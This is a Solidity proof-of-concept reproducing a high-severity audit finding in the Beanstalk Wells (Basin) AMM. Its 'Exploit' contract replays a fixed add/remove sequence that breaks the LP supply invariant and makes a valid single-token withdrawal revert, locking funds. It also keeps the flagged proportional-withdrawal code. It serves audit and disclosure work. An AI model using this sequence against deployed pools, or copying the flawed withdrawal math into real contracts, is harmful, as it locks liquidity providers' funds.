// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*//////////////////////////////////////////////////////////////////////////
    Beanstalk Wells (Basin) — protocol invariant totalSupply == calcLpTokenSupply
    can be broken, bricking a valid removeLiquidityOneToken
    Finding 18431 (Cyfrin, Hans) — HIGH

    Root cause: Well.removeLiquidity withdraws underlying tokens with PROPORTIONAL
    math (`lpAmountIn * reserves[i] / lpTokenSupply`) instead of the Well function,
    so after a proportional removal the stored `reserves` and `totalSupply()` drift
    out of the constant-product relationship the Well function assumes. Once
    `totalSupply()` exceeds `calcLpTokenSupply(reserves)`, `removeLiquidityOneToken`
    computes `newReserveJ = calcReserve(reserves, j, totalSupply - lpAmountIn)` that
    can EXCEED `reserves[j]`, so `tokenAmountOut = reserves[j] - newReserveJ` reverts
    with arithmetic underflow — a *valid* withdrawal permanently reverts (funds
    locked / protocol insolvency).

    This file is a self-contained, cheatcode-free reduction. ConstantProduct2,
    LibMath, and the Well liquidity functions (addLiquidity / removeLiquidity /
    removeLiquidityOneToken / _getRemoveLiquidityOneTokenOut) are copied VERBATIM
    from BeanstalkFarms/Wells commit e5441fc (src/functions/ConstantProduct2.sol,
    src/libraries/LibMath.sol, src/Well.sol). The Exploit replays the finding's
    own fuzz-derived sequence (the exact magic numbers from the PoC) from a single
    actor — the global reserves/totalSupply trajectory, and therefore the terminal
    underflow, are caller-independent — and asserts that the final valid
    removeLiquidityOneToken reverts while the invariant is broken.
//////////////////////////////////////////////////////////////////////////*/

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IWellFunction {
    function calcReserve(uint[] memory reserves, uint j, uint lpTokenSupply, bytes calldata data)
        external
        view
        returns (uint reserve);
    function calcLpTokenSupply(uint[] memory reserves, bytes calldata data)
        external
        view
        returns (uint lpTokenSupply);
}

struct Call {
    address target;
    bytes data;
}

/// @dev Minimal ERC20 used as the two Well tokens.
contract MockToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev VERBATIM from BeanstalkFarms/Wells commit e5441fc, src/libraries/LibMath.sol.
library LibMath {
    function roundedDiv(uint a, uint b) internal pure returns (uint) {
        uint halfB = (b % 2 == 0) ? (b / 2) : (b / 2 + 1);
        return (a % b >= halfB) ? (a / b + 1) : (a / b);
    }

    function sqrt(uint a) internal pure returns (uint z) {
        assembly {
            z := 181
            let y := a
            if iszero(lt(y, 0x10000000000000000000000000000000000)) {
                y := shr(128, y)
                z := shl(64, z)
            }
            if iszero(lt(y, 0x1000000000000000000)) {
                y := shr(64, y)
                z := shl(32, z)
            }
            if iszero(lt(y, 0x10000000000)) {
                y := shr(32, y)
                z := shl(16, z)
            }
            if iszero(lt(y, 0x1000000)) {
                y := shr(16, y)
                z := shl(8, z)
            }
            z := shr(18, mul(z, add(y, 65536)))
            z := shr(1, add(z, div(a, z)))
            z := shr(1, add(z, div(a, z)))
            z := shr(1, add(z, div(a, z)))
            z := shr(1, add(z, div(a, z)))
            z := shr(1, add(z, div(a, z)))
            z := shr(1, add(z, div(a, z)))
            z := shr(1, add(z, div(a, z)))
            if lt(div(a, z), z) { z := div(a, z) }
        }
    }
}

/// @dev VERBATIM from BeanstalkFarms/Wells commit e5441fc, src/functions/ConstantProduct2.sol.
///      Constant-product 2-token Well function: b_0 * b_1 = s^2.
contract ConstantProduct2 is IWellFunction {
    using LibMath for uint;

    uint constant EXP_PRECISION = 1e12;

    /// @dev `s = (b_0 * b_1)^(1/2)`
    function calcLpTokenSupply(uint[] memory reserves, bytes calldata)
        external
        pure
        override
        returns (uint lpTokenSupply)
    {
        lpTokenSupply = (reserves[0] * reserves[1] * EXP_PRECISION).sqrt();
    }

    /// @dev `b_j = s^2 / b_{i | i != j}`
    function calcReserve(uint[] memory reserves, uint j, uint lpTokenSupply, bytes calldata)
        external
        pure
        override
        returns (uint reserve)
    {
        reserve = lpTokenSupply ** 2 / EXP_PRECISION;
        reserve = LibMath.roundedDiv(reserve, reserves[j == 1 ? 0 : 1]);
    }
}

/// @notice Reduced Well. The liquidity functions are copied VERBATIM from
///         BeanstalkFarms/Wells commit e5441fc, src/Well.sol; the immutable-args
///         plumbing (tokens()/wellFunction()) is replaced by constructor state.
contract Well is IERC20 {
    // --- LP token (ERC20) ---
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    IERC20[] private _tokensArr;
    IWellFunction public wf;
    uint256[] private _reserves;
    bool private _entered;

    error SlippageOut(uint256 amountOut, uint256 minAmountOut);
    error SlippageIn(uint256 amountIn, uint256 maxAmountIn);
    error InvalidReserves();
    error Expired();

    modifier nonReentrant() {
        require(!_entered, "REENTRANCY");
        _entered = true;
        _;
        _entered = false;
    }

    modifier expire(uint deadline) {
        if (block.timestamp > deadline) revert Expired();
        _;
    }

    constructor(IERC20 token0, IERC20 token1, IWellFunction _wf) {
        _tokensArr.push(token0);
        _tokensArr.push(token1);
        wf = _wf;
        _reserves.push(0);
        _reserves.push(0);
    }

    // --- LP ERC20 ops ---
    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function _mint(address to, uint256 amt) internal {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function _burn(address from, uint256 amt) internal {
        totalSupply -= amt;
        balanceOf[from] -= amt;
    }

    function tokens() public view returns (IERC20[] memory ts) {
        ts = _tokensArr;
    }

    function wellFunction() public view returns (Call memory c) {
        c.target = address(wf);
        c.data = "";
    }

    function getReserves() external view returns (uint[] memory reserves) {
        reserves = _getReserves(_tokensArr.length);
    }

    function _getReserves(uint n) internal view returns (uint[] memory reserves) {
        reserves = new uint[](n);
        for (uint i; i < n; ++i) reserves[i] = _reserves[i];
    }

    function _setReserves(IERC20[] memory _tokens, uint[] memory reserves) internal {
        for (uint i; i < reserves.length; ++i) {
            if (reserves[i] > _tokens[i].balanceOf(address(this))) revert InvalidReserves();
        }
        for (uint i; i < reserves.length; ++i) _reserves[i] = reserves[i];
    }

    function _updatePumps(uint n) internal view returns (uint[] memory reserves) {
        reserves = _getReserves(n);
    }

    function _calcLpTokenSupply(Call memory _wellFunction, uint[] memory reserves)
        internal
        view
        returns (uint lpTokenSupply)
    {
        lpTokenSupply = IWellFunction(_wellFunction.target).calcLpTokenSupply(reserves, _wellFunction.data);
    }

    function _calcReserve(Call memory _wellFunction, uint[] memory reserves, uint j, uint lpTokenSupply)
        internal
        view
        returns (uint reserve)
    {
        reserve = IWellFunction(_wellFunction.target).calcReserve(reserves, j, lpTokenSupply, _wellFunction.data);
    }

    function _getJ(IERC20[] memory _tokens, IERC20 jToken) internal pure returns (uint j) {
        for (j; j < _tokens.length; ++j) {
            if (jToken == _tokens[j]) return j;
        }
        revert("InvalidTokens");
    }

    //////////////////// ADD LIQUIDITY (VERBATIM src/Well.sol L393-424) ////////////////////

    function addLiquidity(uint[] memory tokenAmountsIn, uint minLpAmountOut, address recipient, uint deadline)
        external
        nonReentrant
        expire(deadline)
        returns (uint lpAmountOut)
    {
        IERC20[] memory _tokens = tokens();
        uint[] memory reserves = _updatePumps(_tokens.length);

        for (uint i; i < _tokens.length; ++i) {
            if (tokenAmountsIn[i] == 0) continue;
            _tokens[i].transferFrom(msg.sender, address(this), tokenAmountsIn[i]);
            reserves[i] = reserves[i] + tokenAmountsIn[i];
        }

        lpAmountOut = _calcLpTokenSupply(wellFunction(), reserves) - totalSupply;
        if (lpAmountOut < minLpAmountOut) revert SlippageOut(lpAmountOut, minLpAmountOut);

        _mint(recipient, lpAmountOut);
        _setReserves(_tokens, reserves);
    }

    function getAddLiquidityOut(uint[] memory tokenAmountsIn) external view returns (uint lpAmountOut) {
        IERC20[] memory _tokens = tokens();
        uint[] memory reserves = _getReserves(_tokens.length);
        for (uint i; i < _tokens.length; ++i) reserves[i] = reserves[i] + tokenAmountsIn[i];
        lpAmountOut = _calcLpTokenSupply(wellFunction(), reserves) - totalSupply;
    }

    //////////////////// REMOVE LIQUIDITY: BALANCED (VERBATIM src/Well.sol L440-463) ////////////////////

    function removeLiquidity(uint lpAmountIn, uint[] calldata minTokenAmountsOut, address recipient, uint deadline)
        external
        nonReentrant
        expire(deadline)
        returns (uint[] memory tokenAmountsOut)
    {
        IERC20[] memory _tokens = tokens();
        uint[] memory reserves = _updatePumps(_tokens.length);
        uint lpTokenSupply = totalSupply;

        tokenAmountsOut = new uint[](_tokens.length);
        _burn(msg.sender, lpAmountIn);
        for (uint i; i < _tokens.length; ++i) {
            tokenAmountsOut[i] = (lpAmountIn * reserves[i]) / lpTokenSupply; // @> VULN: proportional withdrawal ignores the Well function -> breaks totalSupply == calcLpTokenSupply(reserves)
            if (tokenAmountsOut[i] < minTokenAmountsOut[i]) revert SlippageOut(tokenAmountsOut[i], minTokenAmountsOut[i]);
            _tokens[i].transfer(recipient, tokenAmountsOut[i]);
            reserves[i] = reserves[i] - tokenAmountsOut[i];
        }

        _setReserves(_tokens, reserves);
    }

    function getRemoveLiquidityOut(uint lpAmountIn) external view returns (uint[] memory tokenAmountsOut) {
        IERC20[] memory _tokens = tokens();
        uint[] memory reserves = _getReserves(_tokens.length);
        uint lpTokenSupply = totalSupply;
        tokenAmountsOut = new uint[](_tokens.length);
        for (uint i; i < _tokens.length; ++i) {
            tokenAmountsOut[i] = (lpAmountIn * reserves[i]) / lpTokenSupply;
        }
    }

    //////////////////// REMOVE LIQUIDITY: ONE TOKEN (VERBATIM src/Well.sol L478-527) ////////////////////

    function removeLiquidityOneToken(
        uint lpAmountIn,
        IERC20 tokenOut,
        uint minTokenAmountOut,
        address recipient,
        uint deadline
    ) external nonReentrant expire(deadline) returns (uint tokenAmountOut) {
        IERC20[] memory _tokens = tokens();
        uint[] memory reserves = _updatePumps(_tokens.length);
        uint j = _getJ(_tokens, tokenOut);

        tokenAmountOut = _getRemoveLiquidityOneTokenOut(lpAmountIn, j, reserves);
        if (tokenAmountOut < minTokenAmountOut) revert SlippageOut(tokenAmountOut, minTokenAmountOut);

        _burn(msg.sender, lpAmountIn);
        tokenOut.transfer(recipient, tokenAmountOut);

        reserves[j] = reserves[j] - tokenAmountOut;
        _setReserves(_tokens, reserves);
    }

    function getRemoveLiquidityOneTokenOut(uint lpAmountIn, IERC20 tokenOut)
        external
        view
        returns (uint tokenAmountOut)
    {
        IERC20[] memory _tokens = tokens();
        uint[] memory reserves = _getReserves(_tokens.length);
        uint j = _getJ(_tokens, tokenOut);
        tokenAmountOut = _getRemoveLiquidityOneTokenOut(lpAmountIn, j, reserves);
    }

    function _getRemoveLiquidityOneTokenOut(uint lpAmountIn, uint j, uint[] memory reserves)
        private
        view
        returns (uint tokenAmountOut)
    {
        uint newLpTokenSupply = totalSupply - lpAmountIn;
        uint newReserveJ = _calcReserve(wellFunction(), reserves, j, newLpTokenSupply);
        tokenAmountOut = reserves[j] - newReserveJ; // @> underflow site when the invariant is broken (newReserveJ > reserves[j])
    }
}

/// @notice Replays the finding's fuzz-derived add/remove sequence (verbatim magic
///         numbers) from a single actor, then shows a valid removeLiquidityOneToken
///         reverts with arithmetic underflow because the invariant is broken.
contract Exploit {
    uint256 constant INIT = 1_000e18; // setupWell(2) seeds 1000e18 of each token

    MockToken public token0;
    MockToken public token1;
    ConstantProduct2 public cp2;
    Well public well;

    bool public finalWithdrawReverted;
    uint256 public lockedLp;
    uint256 public totalSupplyAfter;
    uint256 public calcSupplyAfter;

    constructor() {
        token0 = new MockToken(); // CREATE nonce 1
        token1 = new MockToken(); // CREATE nonce 2
        cp2 = new ConstantProduct2(); // CREATE nonce 3
        well = new Well(IERC20(address(token0)), IERC20(address(token1)), IWellFunction(address(cp2))); // CREATE nonce 4

        // fund this actor generously for all adds
        token0.mint(address(this), type(uint128).max);
        token1.mint(address(this), type(uint128).max);
        token0.approve(address(well), type(uint256).max);
        token1.approve(address(well), type(uint256).max);

        // setupWell(2): initial 1000e18 / 1000e18 -> 1e27 LP
        _add(INIT, INIT);
    }

    function _add(uint256 a0, uint256 a1) internal returns (uint256) {
        uint[] memory amts = new uint[](2);
        amts[0] = a0;
        amts[1] = a1;
        return well.addLiquidity(amts, 0, address(this), type(uint256).max);
    }

    function _removeLiq(uint256 lp) internal {
        uint[] memory minOut = new uint[](2);
        well.removeLiquidity(lp, minOut, address(this), type(uint256).max);
    }

    function _removeOne(uint256 lp, uint256 idx) internal {
        IERC20 t = idx == 0 ? IERC20(address(token0)) : IERC20(address(token1));
        well.removeLiquidityOneToken(lp, t, 0, address(this), type(uint256).max);
    }

    function run() external {
        // === the finding's PoC sequence (test_getRemoveLiquidityOneTokenOutArithmeticFail),
        //     verbatim magic numbers, all from a single actor (global-state trajectory is
        //     caller-independent). ===
        _add(77_470_052_844_788_801_811_950_156_551, 17_435);
        _removeOne(5267, 0);
        _add(79_228_162_514_264_337_593_543_950_335, 0);
        _removeLiq(2_025_932_259_663_320_959_193_637_370_794);
        _add(69_069_904_726_099_247_337_000_262_288, 3);
        // ADDRESS_1 -> ADDRESS_3 LP transfer is a no-op here (single actor holds all LP)
        _removeLiq(122_797_404_990_851_137_316_041_024_188);
        _removeOne(1_690_276_116_468_540_706_301_000_000_000, 1);

        // The invariant is now broken: totalSupply() has drifted above calcLpTokenSupply(reserves).
        uint[] memory r = well.getReserves();
        totalSupplyAfter = well.totalSupply();
        calcSupplyAfter = cp2.calcLpTokenSupply(r, "");

        // A VALID withdrawal of the remaining position now reverts with arithmetic
        // underflow (reserves[j] - newReserveJ, newReserveJ > reserves[j]).
        lockedLp = 324_542_928;
        (bool ok,) = address(well).call(
            abi.encodeWithSelector(
                Well.removeLiquidityOneToken.selector,
                lockedLp,
                IERC20(address(token0)),
                uint256(0),
                address(this),
                type(uint256).max
            )
        );
        finalWithdrawReverted = !ok;

        // ---- HARM ASSERTIONS ----
        // 1. The protocol invariant totalSupply() == calcLpTokenSupply(reserves) is broken.
        require(totalSupplyAfter != calcSupplyAfter, "invariant unexpectedly held");
        require(totalSupplyAfter > calcSupplyAfter, "totalSupply did not drift above calc supply");

        // 2. A valid removeLiquidityOneToken reverts -> the LP position cannot be
        //    withdrawn via the one-token exit path (funds locked / liveness brick).
        require(finalWithdrawReverted, "expected valid withdrawal to revert (funds locked)");

        // 3. The locked LP is still held by the actor (the failed exit changed nothing).
        require(well.balanceOf(address(this)) >= lockedLp, "locked LP not retained");
    }
}
